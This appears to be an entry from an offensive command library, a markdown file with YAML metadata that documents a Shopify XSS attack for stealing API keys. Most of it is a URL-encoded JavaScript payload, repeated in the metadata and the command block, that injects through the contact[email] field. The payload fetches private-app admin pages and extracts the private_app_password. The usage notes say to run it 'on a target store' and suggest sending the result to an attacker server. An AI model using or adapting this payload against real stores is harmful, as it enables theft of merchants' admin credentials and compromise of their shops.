---
id: cmd-uuid-2
data: >-
  https://bugbountyayo.myshopify.com/?contact[email]
  onfocus%3djavascript:%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%27%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%2b%64%61%74%61%2e%73%70%6c%69%74%28%27%68%72%65%66%3d%22%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%61%6c%65%72%74%28%64%61%74%61%2e%73%70%6c%69%74%28%27%69%64%3d%22%70%72%69%76%61%74%65%5f%61%70%70%5f%70%61%73%73%77%6f%72%64%22%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%76%61%6c%75%65%3d%22%27%29%2e%73%6c%69%63%65%28%31%29%2e%73%68%69%66%74%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%29%7d%29%29%7d%29%7d%29%29%7d%29
  autofocus a=a&form_type[a]aaa
tags:
  - xss
  - shopify
  - api-key-theft
type: command
output: Alert with extracted API password
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:06.622Z'
verified: false
validated: true
submitted: true
---
# shopify-newsletter-xss-steal-api-key

## Command

```bash
https://bugbountyayo.myshopify.com/?contact[email] onfocus%3djavascript:%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%27%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%66%65%74%63%68%28%27%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%2b%64%61%74%61%2e%73%70%6c%69%74%28%27%68%72%65%66%3d%22%2f%61%64%6d%69%6e%2f%61%70%70%73%2f%70%72%69%76%61%74%65%2f%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%2c%7b%68%65%61%64%65%72%73%3a%7b%27%58%2d%53%68%6f%70%69%66%79%2d%57%65%62%27%3a%31%7d%7d%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%64%61%74%61%2e%74%65%78%74%28%29%2e%74%68%65%6e%28%66%75%6e%63%74%69%6f%6e%28%64%61%74%61%29%7b%61%6c%65%72%74%28%64%61%74%61%2e%73%70%6c%69%74%28%27%69%64%3d%22%70%72%69%76%61%74%65%5f%61%70%70%5f%70%61%73%73%77%6f%72%64%22%27%29%2e%70%6f%70%28%29%2e%73%70%6c%69%74%28%27%76%61%6c%75%65%3d%22%27%29%2e%73%6c%69%63%65%28%31%29%2e%73%68%69%66%74%28%29%2e%73%70%6c%69%74%28%27%22%27%29%2e%73%68%69%66%74%28%29%29%7d%29%29%7d%29%7d%29%29%7d%29 autofocus a=a&form_type[a]aaa
```

## Description

Advanced URL command exploiting XSS to steal Shopify private app API keys by injecting encoded JS that fetches and parses admin data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| contact[email] | Encoded JS payload for onfocus | Yes |
| form_type[a] | Enables mass assignment | Yes |
| fetch(...) | Chained JS for admin access and parsing | Yes |

## Examples

### Basic Usage

```bash
Use the full URL on a target store
```

### Advanced Usage

Customize app ID parsing or exfil method (e.g., send to attacker server).

## Expected Output

Console logs of HTML responses and alert with API password (e.g., shpss_...).

## Related

- [[commands/shopify-fetch-private-app-password]]
- [[procedures/Exploit-XSS-to-Steal-Administrative-API-Keys]]
